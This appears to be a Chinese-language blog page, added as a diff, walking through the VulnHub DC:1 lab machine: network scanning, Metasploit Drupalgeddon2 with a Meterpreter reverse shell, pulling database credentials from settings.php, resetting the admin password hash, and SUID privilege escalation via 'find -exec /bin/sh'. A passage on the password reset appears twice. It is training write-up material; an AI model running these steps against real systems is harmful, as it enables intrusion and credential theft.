@@ -1,0 +1,611 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="ch">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="又是美好的一天呀！" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="又是美好的一天呀！" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="又是美好的一天呀！" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="打靶|DC系列" />
+
+
+<link rel="canonical" href="http://example.com/2023/03/12/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91/">
+
+
+
+  <title>
+VulnHub靶机渗透之DC:1 【DC系列】 |
+highgerms's blog = 又是美好的一天呀！</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">VulnHub靶机渗透之DC:1 【DC系列】
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-03-12 01:41:44">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-03-12T01:41:44+08:00">2023-03-12</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">highgerms's blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicljgocqbj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeyonbf9j20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="ch">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/12/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="highgerms">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="又是美好的一天呀！">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="vulnhub靶机渗透之dc1-dc系列"><a class="anchor" href="#vulnhub靶机渗透之dc1-dc系列">#</a> VulnHub 靶机渗透之 DC:1 【DC 系列】</h1>
+<h3 id="发现主机-靶机ip192168124130"><a class="anchor" href="#发现主机-靶机ip192168124130">#</a> 发现主机  ---&gt; 靶机 ip：192.168.124.130</h3>
+<pre><code>nmap -sP 192.168.124.0/24
+# nmap ping扫描 -sP
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224528915.png" alt="1646224528915" /></p>
+<pre><code>netdiscover -r 192.168.124.0/24 
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224347329.png" alt="1646224347329" /></p>
+<pre><code>arp-scan -l
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224093605.png" alt="1646224093605" /></p>
+<h3 id="扫描靶机开放端口-22-80-111-54150"><a class="anchor" href="#扫描靶机开放端口-22-80-111-54150">#</a> 扫描靶机开放端口 -》22、80、111、54150</h3>
+<pre><code>nmap -p1-65535 192.168.124.130  
+# nmap指定端口扫描，查看是否开放 -p
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224787388.png" alt="1646224787388" /></p>
+<h3 id="扫描靶机操作系统-linux-3x"><a class="anchor" href="#扫描靶机操作系统-linux-3x">#</a> 扫描靶机操作系统 -》Linux 3.X</h3>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224959511.png" alt="1646224959511" /></p>
+<h3 id="nmap进行完整全面的扫描"><a class="anchor" href="#nmap进行完整全面的扫描">#</a> nmap 进行完整全面的扫描</h3>
+<p>Nmap 进行完整全面的扫描</p>
+<pre><code>nmap –T4 –A –v   192.168.124.130
+看起来还是挺多的
+-A：使用进攻性方式扫描；
+-T4：指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；
+-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节。
+</code></pre>
+<p>但是 冗余细节太多了，我们还是去掉 -v<img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646225545043.png" alt="1646225545043" /></p>
+<pre><code>nmap –T4 –A   192.168.124.130
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226466845.png" alt="1646226466845" /></p>
+<p>80 端口是 drupal 7 服务</p>
+<p>111 端口是 rpcbind 服务</p>
+<p>网站还有 robots.txt，不能爬取的有那 36 个目录，可以看看</p>
+<p>大部分都是 403forbidden 和 access denied</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226706196.png" alt="1646226706196" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226907705.png" alt="1646226907705" /></p>
+<p>创个用户，下图反映出肯定有 admin 管理员用户存在。</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226965872.png" alt="1646226965872" /></p>
+<h3 id="对网站进行指纹识别发现是个drupal-7的cms"><a class="anchor" href="#对网站进行指纹识别发现是个drupal-7的cms">#</a> 对网站进行指纹识别：发现是个 Drupal 7 的 cms</h3>
+<p>通过插件 wappalyzer 可以简单识别，也可以通过 WhatWeb 工具扫描查看详细指纹信息。</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646225759189.png" alt="1646225759189" /></p>
+<p>Whatweb 是一个基于 Ruby 语言的开源网站指纹识别软件，whatweb 能够识别各种关于网站的详细信息包括：CMS 类型、博客平台、中间件、web 框架模块、网站服务器、脚本类型、JavaScript 库、IP、cookie 等等。</p>
+<pre><code>whatweb -v  192.168.124.130 
+-v 详细显示扫描的结果
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226244572.png" alt="1646226244572" /></p>
+<h3 id="对网站进行目录扫描"><a class="anchor" href="#对网站进行目录扫描">#</a> 对网站进行目录扫描</h3>
+<p>dirb 是基于字典的 Web 目录扫描工具。该工具根据用户提供的字典，对目标网站目录进行暴力猜测。它会尝试以递归方式进行爆破，以发现更多的路径。</p>
+<pre><code>dirb http://192.168.124.130    
+</code></pre>
+<p>发现了一些目录，但是没啥用</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227430664.png" alt="1646227430664" /></p>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTI0LjEzMC94bWxycGMucGhw">http://192.168.124.130/xmlrpc.php</span></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227359957.png" alt="1646227359957" /></p>
+<h3 id="msf使用drupal框架漏洞突破"><a class="anchor" href="#msf使用drupal框架漏洞突破">#</a> MSF 使用 Drupal 框架漏洞突破</h3>
+<pre><code>#打开msf
+msfconsole
+
+#搜索漏洞
+search drupal
+
+#查看1模块：exploit/unix/webapp/drupal_drupalgeddon2 的描述信息，看看是否可以使用
+info 1
+
+#查看5模块：exploit/unix/webapp/drupal_restws_unserialize 的描述信息，看看是否可以使用
+info 5
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227562528.png" alt="1646227562528" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646365980084.png" alt="1646365980084" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366045144.png" alt="1646366045144" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366282652.png" alt="1646366282652" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366294240.png" alt="1646366294240" /></p>
+<p>看描述版本都符合，但是 exploit/unix/webapp/drupal_restws_unserialize 试了一下，不得行</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366461097.png" alt="1646366461097" /></p>
+<pre><code># 使用1序号这个模块
+msf&gt;use 1  
+
+# 设置payload【payload是利用漏洞exploit之后，在靶机上执行任务时所需的实际代码】
+msf&gt;set payload php/meterpreter/reverse_tcp
+【reverse_tcp是反向shell 被攻击的靶机主动连接攻击机器kali】
+【反向连接一般用被攻击者处于内网，攻击者在外网的情况。对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。】
+【我们不能确定应该选择反向 （reverse）Shell 还是正向 （bind）Shell 的时候就使用反向shell，因为采用reverse的方法一般较为安全，因为是在被攻击机连接攻击机，所以一般不会被防火墙发现；而bind在测试机打开端口时很容易被安全软件和防火墙发现】
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227826898.png" alt="1646227826898" /></p>
+<pre><code>msf&gt;show options
+# 会列出我们选择的这个模块所需的各种参数。
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227967809.png" alt="1646227967809" /></p>
+<p>LHOSTS 是反弹回来的地址，即我们这台攻击者 kali 的 ip 地址，反弹窗口默认都是 4444</p>
+<pre><code>#设置受害者ip：RHOSTS
+set RHOSTS 192.168.124.130
+
+# 发动攻击
+msf&gt;exploit 
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228178866.png" alt="1646228178866" /></p>
+<p>进入 Meterpreter 会话【后渗透阶段】，这说明攻击生效了</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228571153.png" alt="1646228571153" /></p>
+<p>这时我们输入 shell 进入 cmd</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228621131.png" alt="1646228621131" /></p>
+<p>whoami-&gt;www-data  不是 root 用户</p>
+<p>ls-&gt; 发现有个 flag1.txt</p>
+<p>cat flag1.txt 查看 flag 内容：暗示我们要在配置文件中寻找 setting、config 啥的都可以看看</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228701959.png" alt="1646228701959" /></p>
+<p>exit 退出 shell 之后，help 查看 meterpreter 帮助命令</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646230019941.png" alt="1646230019941" /></p>
+<p>获取一个完全交互式 shell 输入：</p>
+<p>​        python -c  'import pty;pty.spawn (&quot;/bin/bash&quot;)'</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232171679.png" alt="1646232171679" /></p>
+<p>刚才 flag1.txt 里面的暗示实在配置文件找</p>
+<pre><code>find . -name *setting*
+find . -name *setting*
+find .是在当前路径下面找
+</code></pre>
+<p>各种查找，出现的都看了一下，最后发现了 flag 存在于默认文件 ./sites/default/settings.php 中</p>
+<pre><code>cat  ./sites/default/settings.php |grep flag
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231611484.png" alt="1646231611484" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231842940.png" alt="1646231842940" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231779389.png" alt="1646231779389" /></p>
+<p>仔细看看里面的 flag 提示</p>
+<pre><code>cat ./sites/default/settings.php
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232262859.png" alt="1646232262859" /></p>
+<p>我们还拿到了 mysql 数据库的账号密码</p>
+<p>'database' =&gt; 'drupaldb',<br />
+'username' =&gt; 'dbuser',<br />
+'password' =&gt; 'R0ck3t',</p>
+<pre><code>mysql -u dbuser -pR0ck3t
+</code></pre>
+<p>使用获得的账号密码登录数据库</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232509043.png" alt="1646232509043" /></p>
+<pre><code>show databases;          #查看数据库
+
+use  drupaldb;              #选择数据库
+
+show tables;                #查看当前数据库下的表名    
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232591220.png" alt="1646232591220" /></p>
+<p>可以看到 users 表</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232628076.png" alt="1646232628076" /></p>
+<pre><code>select * from users; 
+</code></pre>
+<p>看到了 admin 用户和加过密的密码</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232720738.png" alt="1646232720738" /></p>
+<p>我们虽然不能查看密码，但是我们可以更改 admin 密码【密码重置】</p>
+<p>在网上搜到 \scripts\password-hash.sh 这个是加密密码的脚本文件。</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232881497.png" alt="1646232881497" /></p>
+<p>exit 退出 mysql</p>
+<p>输入 php scripts/password-hash.sh 123456</p>
+<p>这个时候我们获取了 123456 加密后的密码</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233078803.png" alt="1646233078803" /></p>
+<p>进入数据库执行更新语句，进行 admin 用户的密码重新设置。</p>
+<pre><code>update users set pass='$S$DuAzjjytMdHT3mmydQXhExGwi6pvHcLImfbhuguLIgY5rFIjauMQ'where uid=1;
+</code></pre>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233200985.png" alt="1646233200985" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233262370.png" alt="1646233262370" /></p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233274405.png" alt="1646233274405" /></p>
+<p>看到已经修改成功。</p>
+<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233338997.png" alt="1646233338997" /></p>
+<p>1：我们可以利用 hashcat 对加密后的密码进行破解，但是比较费时间。</p>
+<p>2：可以更改 admin 密码【密码重置】   ，本文中采用这个方法。</p>
+<p>3：在 exploitdb 中有一个 Drupal7 的攻击脚本，可以增加一个 admin 权限的账号。【 这篇文章有写 <span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNDcyMTkyP2Zyb209YXJ0aWNsZS5kZXRhaWwuMTQ3MjcyMiVFMyU4MCU5MQ==">https://cloud.tencent.com/developer/article/1472192?from=article.detail.1472722】</span></p>
+<p>在网上搜到 \scripts\password-hash.sh 这个是加密密码的脚本文件。</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/1646232881497.png" alt="img" /></p>
+<p>exit 退出 mysql</p>
+<p>输入 php scripts/password-hash.sh 123456</p>
+<p>这个时候我们获取了 123456 加密后的密码</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/1646233078803-1024x174.png" alt="img" /></p>
+<p>进入数据库执行更新语句，进行 admin 用户的密码重新设置。</p>
+<pre><code>update users set pass='$S$DuAzjjytMdHT3mmydQXhExGwi6pvHcLImfbhuguLIgY5rFIjauMQ'where uid=1;
+</code></pre>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/1646233200985.png" alt="img" /></p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/1646233262370.png" alt="img" /></p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/1646233262370.png" alt="img" /></p>
+<p>看到已经修改成功。</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/1646233338997-1024x188.png" alt="img" /></p>
+<p>然后我们登录试试【admin 123456】</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-2-1024x459.png" alt="img" /></p>
+<p>登陆进去了，到处看看有没有 flag。</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-3-1024x466.png" alt="img" /></p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-4-1024x246.png" alt="img" /></p>
+<p>提示：shadow 文件  passwd 文件 -exec 参数</p>
+<p>想要看 /etc/shadow，权限不够【Linux 为了考虑安全性，用单独的 shadow 文件存储 Linux 用户的密码信息，并且只有 root 用户有权限读取此文件。】。看了 /etc/passwd 发现 flag4</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-5.png" alt="img" /></p>
+<p>发现 flag4： 提醒我们需要越权 -&gt;root</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-6.png" alt="img" /></p>
+<p>用 SUID 命令提权。【** 是一种特殊权限，设置了 suid 的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限。** 例如程序文件的属主是 root，那么执行该程序的用户就将暂时获得 root 账户的权限。sgid 与 suid 类似，只是执行程序时获得的是文件属组的权限。】</p>
+<p>find /-user root -perm -4000 -print 2&gt;/dev/null  命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。【find /-perm -4000 这个也行】</p>
+<p>可以看到 find 也在其中，直接使用 find 命令进行越权。</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-7.png" alt="img" /></p>
+<p>flag3 提示利用 find 的 - exec 参数，因为 find 在执行时临时得到了 root 权限，所以 - exec 后面的命令是以 root 权限执行的，执行一个 /bin/sh 就拿到 root shell 了。</p>
+<p>find / -exec “/bin/sh” ;</p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-8.png" alt="img" /></p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-10.png" alt="img" /></p>
+<p><img data-src="http://175.178.148.213/wp-content/uploads/2022/03/%E5%9B%BE%E7%89%87-9.png" alt="img" /></p>
+<p>通过这个靶机学到了</p>
+<p>​    1. 使用 nmap  ，netdiscover 、arp-scan、what-web、dirb 进行信息收集，获取到靶机。</p>
+<p>​    2. 了解到 drupal 是 PHP 的 CMS 框架，msf 有 Drupal 框架漏洞突破的模块，了解了 drupal 数据库密码生成位置，和数据库配置。</p>
+<p>​    3. 掌握了 MSF 的基础使用方法，通过 MSF 框架进行对靶机项目的漏洞利用。</p>
+<p>​    4. 学会了 suid 提权，通过 find 获取到 root 的 suid，suid 具有传递性，从而拿到 root 权限。</p>
+<p>参考资料：</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9zaHUxbC5naXRodWIuaW8vMjAyMC8wNC8yNy9tc2YtZmFuLWRhbi1wYXlsb2FkLXh1ZS14aQ==">https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi</span>/ 【msf 反弹 payload 学习 】</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTE5MjYzNzMzJUUzJTgwJTkwbXNmJUU3JTlBJTg0cmV2ZXJzZV90Y3AlRTUlOTIlOENiaW5kX3RjcCVFNCVCOCVBNCVFOCU4MCU4NSVFNyU5QSU4NCVFNSU4QyVCQSVFNSU4OCVBQiVFMyU4MCU5MQ==">https://blog.csdn.net/weixin_54515836/article/details/119263733【msf 的 reverse_tcp 和 bind_tcp 两者的区别】</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNDcyMTkyP2Zyb209YXJ0aWNsZS5kZXRhaWwuMTQ3MjcyMg==">https://cloud.tencent.com/developer/article/1472192?from=article.detail.1472722</span>  【VulnHub 靶机渗透之 DC:1】</p>
+<p>打靶系列之 – dc-1 【零度安全攻防实验室】</p>
+<p>韭要打 vulnhub 之 DC-1 Writeup</p>
+<p>​</p>
+
+      <div class="tags">
+          <a href="/tags/%E6%89%93%E9%9D%B6-DC%E7%B3%BB%E5%88%97/" rel="tag"><i class="ic i-tag"></i> 打靶|DC系列</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-03-12 01:45:54" itemprop="dateModified" datetime="2023-03-12T01:45:54+08:00">2023-03-12</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="highgerms 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="highgerms 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="highgerms 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
